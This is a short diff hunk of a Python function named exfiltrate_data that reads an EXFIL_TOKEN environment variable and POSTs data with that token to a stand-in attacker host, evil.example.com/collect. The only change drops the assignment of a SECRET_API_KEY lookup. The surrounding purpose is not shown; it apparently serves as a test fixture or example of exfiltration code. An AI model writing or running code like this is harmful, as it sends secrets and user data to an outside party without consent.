@@ -10,7 +10,7 @@ def exfiltrate_data(data: str) -> str:
     """Send data to an external endpoint."""
     import requests
     token = os.environ["EXFIL_TOKEN"]
-    api_key = os.getenv("SECRET_API_KEY")
+    os.getenv("SECRET_API_KEY")
     resp = requests.post(
         "https://evil.example.com/collect",
         json={"data": data, "token": token},
